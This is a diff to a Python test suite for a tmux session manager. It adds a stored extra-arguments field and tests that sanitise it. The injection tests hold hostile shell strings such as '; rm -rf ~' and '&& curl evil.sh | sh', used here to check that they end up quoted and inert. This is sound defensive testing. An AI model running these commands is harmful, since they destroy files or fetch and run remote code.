@@ -376,7 +376,7 @@ def test_pty_websocket_bridge(monkeypatch):
     monkeypatch.setattr(
         sessions,
         "attach_argv",
-        lambda host, name, kind, path=None, resume="", mouse=True, history=None: [
+        lambda host, name, kind, path=None, resume="", mouse=True, history=None, args="": [
             "python3", "-u", "-c",
             'import sys; print("READY"); print("GOT:"+sys.stdin.readline().strip())',
         ],
@@ -406,7 +406,7 @@ def test_pty_websocket_bridge(monkeypatch):
 def _ws_close_code(monkeypatch, exists):
     # attach to a program that exits immediately, so the PTY EOFs and _close runs
     monkeypatch.setattr(sessions, "attach_argv",
-                        lambda host, name, kind, path=None, resume="", mouse=True, history=None: ["python3", "-u", "-c", "print('bye')"])
+                        lambda host, name, kind, path=None, resume="", mouse=True, history=None, args="": ["python3", "-u", "-c", "print('bye')"])
     monkeypatch.setattr(sessions, "session_exists", lambda host, name: exists)
     with TestClient(app).websocket_connect("/ws/attach?host=local&kind=shell&label=t") as ws:
         for _ in range(20):
@@ -803,7 +803,7 @@ def test_set_dir_argv_and_clean_dir():
 def test_start_dir_parsed_from_listing(monkeypatch):
     # @serai_dir rides the listing next to the live cwd; both reach the Session
     now = int(time.time())
-    listing = f"shell-x::0::{now}::prod::bash::0::~/git/proj::/home/u/elsewhere\n"
+    listing = f"shell-x::0::{now}::prod::bash::0::::~/git/proj::/home/u/elsewhere\n"
     def fake_run(argv, timeout=6):
         if "list-sessions" in argv:
             return listing
@@ -870,11 +870,11 @@ def test_state_and_tail_from_listing(monkeypatch):
     now = int(time.time())
     listing = (
         # name::attached::activity::tags::command::@serai_dir::path (dir empty here)
-        f"cc-working::0::{now}::::node::0::::/home/u/app\n"        # "esc to interrupt" -> working
-        f"cc-recent::0::{now - 60}::::node::0::::/home/u/app\n"    # parked at prompt, recent -> done
-        f"cc-stale::0::{now - 99999}::::node::0::::/home/u/app\n"  # dormant cc -> idle
-        f"shell-run::0::{now - 99999}::::npm::0::::/home/u/app\n"  # process running -> working
-        f"shell-idle::0::{now - 99999}::::bash::0::::/home/u/app\n"# quiet shell at prompt -> idle
+        f"cc-working::0::{now}::::node::0::::::/home/u/app\n"        # "esc to interrupt" -> working
+        f"cc-recent::0::{now - 60}::::node::0::::::/home/u/app\n"    # parked at prompt, recent -> done
+        f"cc-stale::0::{now - 99999}::::node::0::::::/home/u/app\n"  # dormant cc -> idle
+        f"shell-run::0::{now - 99999}::::npm::0::::::/home/u/app\n"  # process running -> working
+        f"shell-idle::0::{now - 99999}::::bash::0::::::/home/u/app\n"# quiet shell at prompt -> idle
     )
     def fake_run(argv, timeout=6):
         if "list-sessions" in argv:
@@ -2219,6 +2219,116 @@ def test_upsert_prefers_the_configured_start_dir_over_the_pane_cwd(tmp_path, mon
     assert [r["path"] for r in store.saved() if r["name"] == "cc-y"] == ["/home/u/git/b"]
 
 
+def test_clean_args_quotes_every_token_so_nothing_can_inject():
+    """Invariant #3 guard. This is the only user-typed text that becomes part of
+    the command string tmux hands to a shell, so every token must carry its own
+    quoting -- a metacharacter has to arrive at `claude` as literal text."""
+    assert sessions.clean_args("--chrome --resume") == "--chrome --resume"
+    assert sessions.clean_args("  --model  opus  ") == "--model opus"
+    assert sessions.clean_args("") == ""
+    # shell metacharacters survive only as inert, quoted arguments
+    for hostile in ["; rm -rf ~", "&& curl evil.sh | sh", "$(id)", "`id`", "| tee /etc/x",
+                    "--x > /etc/passwd", "a & b"]:
+        out = sessions.clean_args(hostile)
+        tokens = shlex.split(out)
+        assert shlex.split(hostile) == tokens, "tokens must survive intact"
+        # nothing a shell would act on is left unquoted
+        for meta in [";", "&&", "|", "$(", "`", ">", "&"]:
+            bare = [t for t in out.split(" ") if meta in t and not (t.startswith("'") and t.endswith("'"))]
+            assert not bare, f"unquoted {meta!r} left in {out!r}"
+
+
+def test_clean_args_is_idempotent_and_rejects_the_unparseable():
+    """The stored value is what the edit dialog shows back, so re-cleaning it
+    must not keep re-quoting; and anything that would corrupt the listing parse
+    is refused rather than mangled."""
+    once = sessions.clean_args("; rm -rf ~")
+    assert sessions.clean_args(once) == once
+    for bad, why in [("--x 'unbalanced", "unbalanced quote"),
+                     ("--a::b", "the _FMT field separator"),
+                     ("--a\nb", "a newline would break the line-based listing"),
+                     ("-" * 600, "absurd length")]:
+        with pytest.raises(ValueError):
+            sessions.clean_args(bad)
+        assert why
+
+
+def test_extra_args_reach_claude_in_both_builders():
+    argv = sessions.attach_argv("local", "cc-x", "claude", path="/tmp/proj",
+                                resume="resume", args="--chrome")
+    assert "cd /tmp/proj && claude --resume --chrome" in argv
+    assert "claude --chrome" in sessions.attach_argv("local", "cc-x", "claude", args="--chrome")
+    restore = sessions.restore_argv("local", "cc-x", "claude", "/tmp/proj", "resume", "--chrome")
+    assert "claude --resume --chrome" in restore
+    # a shell has no command of ours to carry them, so they're ignored there
+    assert not any("--chrome" in a for a in
+                   sessions.attach_argv("local", "shell-x", "shell", args="--chrome"))
+
+
+def test_args_parsed_from_listing_without_shifting_the_path(monkeypatch):
+    """@serai_args sits *before* @serai_dir precisely because the pane path must
+    stay the last field -- it can contain '::'. Prove both still land right."""
+    now = int(time.time())
+    listing = f"cc-x::0::{now}::prod::node::0::--chrome::~/git/proj::/home/u/we::ird\n"
+    monkeypatch.setattr(sessions, "_run", lambda argv, timeout=6: listing)
+    monkeypatch.setattr(sessions, "_capture_lines", lambda host, name: [])
+    s = sessions.list_sessions("local")[0]
+    assert s.args == "--chrome"
+    assert s.dir == "~/git/proj"
+    assert s.path == "/home/u/we::ird", "the path must still absorb the trailing '::'"
+
+
+def test_upsert_keeps_stored_args_when_a_session_comes_back_bare(tmp_path, monkeypatch):
+    """The three-for-three rule, designed in rather than retrofitted: a session
+    recreated without its @serai_args must not erase the stored value."""
+    monkeypatch.setenv("SERAI_CONFIG_DIR", str(tmp_path))
+    store.upsert([{"host": "local", "name": "cc-x", "kind": "claude", "label": "x",
+                   "path": "/home/u/git/proj", "tags": [], "args": "--chrome"}])
+    store.upsert([{"host": "local", "name": "cc-x", "kind": "claude", "label": "x",
+                   "path": "/home/u/git/proj", "tags": [], "args": ""}])
+    assert store.saved()[0]["args"] == "--chrome"
+    # a deliberate clear goes through set_args and does stick
+    store.set_args("local", "cc-x", "")
+    store.upsert([{"host": "local", "name": "cc-x", "kind": "claude", "label": "x",
+                   "path": "/home/u/git/proj", "tags": [], "args": ""}])
+    assert store.saved()[0]["args"] == ""
+
+
+def test_api_args_sanitises_and_records(monkeypatch, tmp_path):
+    monkeypatch.setenv("SERAI_CONFIG_DIR", str(tmp_path))
+    monkeypatch.setattr(config, "parse_ssh_config", lambda *a, **k: [])
+    sent = []
+    monkeypatch.setattr("serai.main.sessions.run_send", lambda argv: sent.append(argv) or True)
+    client = TestClient(app)
+    r = client.post("/api/args", json={"host": "local", "name": "cc-x", "args": "; rm -rf ~"})
+    assert r.status_code == 200
+    assert r.json()["args"] == "';' rm -rf '~'", "every token quoted before it reaches tmux"
+    assert "';' rm -rf '~'" in sent[-1], "the quoted form is what gets stored"
+    # unparseable input is refused rather than guessed at
+    bad = client.post("/api/args", json={"host": "local", "name": "cc-x", "args": "--x 'oops"})
+    assert bad.status_code == 400 and "error" in bad.json()
+    # an unknown host is refused like every other session endpoint (invariant #3)
+    assert client.post("/api/args", json={"host": "evil", "name": "cc-x",
+                                          "args": "--a"}).status_code == 400
+
+
+def test_restart_keeps_the_restore_record_unlike_kill(monkeypatch, tmp_path):
+    """The whole point of a separate endpoint: /api/kill calls store.remove, which
+    would throw away the record the client needs to bring the session back."""
+    monkeypatch.setenv("SERAI_CONFIG_DIR", str(tmp_path))
+    monkeypatch.setattr(config, "parse_ssh_config", lambda *a, **k: [])
+    monkeypatch.setattr("serai.main.sessions.run_send", lambda argv: True)
+    store.upsert([{"host": "local", "name": "cc-x", "kind": "claude", "label": "x",
+                   "path": "/home/u/git/proj", "tags": [], "args": "--chrome"}])
+    client = TestClient(app)
+    assert client.post("/api/sessions/restart",
+                       json={"host": "local", "name": "cc-x"}).status_code == 200
+    assert [r["name"] for r in store.saved()] == ["cc-x"], "restart must not forget the session"
+    assert store.saved()[0]["args"] == "--chrome"
+    client.post("/api/kill", json={"host": "local", "name": "cc-x"})
+    assert store.saved() == [], "kill, by contrast, does drop it"
+
+
 def test_clean_dir_refuses_serais_own_directory():
     """A stale client echoing serai's own cwd back on attach is exactly how the
     bad dir got stamped onto @serai_dir and stuck. Normalised, so a trailing
@@ -2305,8 +2415,8 @@ def test_alternate_screen_flag_parsed_without_shifting_the_path(monkeypatch):
     scrolls itself) instead of tmux copy-mode, which there is a no-op. The path
     stays the LAST field, so adding this must not shift it."""
     now = int(time.time())
-    listing = (f"shell-tui::0::{now}::prod::less::1::~/git/proj::/home/u/app\n"
-               f"shell-plain::0::{now}::::bash::0::~/git/proj::/home/u/app\n")
+    listing = (f"shell-tui::0::{now}::prod::less::1::::~/git/proj::/home/u/app\n"
+               f"shell-plain::0::{now}::::bash::0::::~/git/proj::/home/u/app\n")
     monkeypatch.setattr(sessions, "_run", lambda argv, timeout=6:
                         listing if "list-sessions" in argv else "")
     by = {s.name: s for s in sessions._list_sessions_uncached("local")}
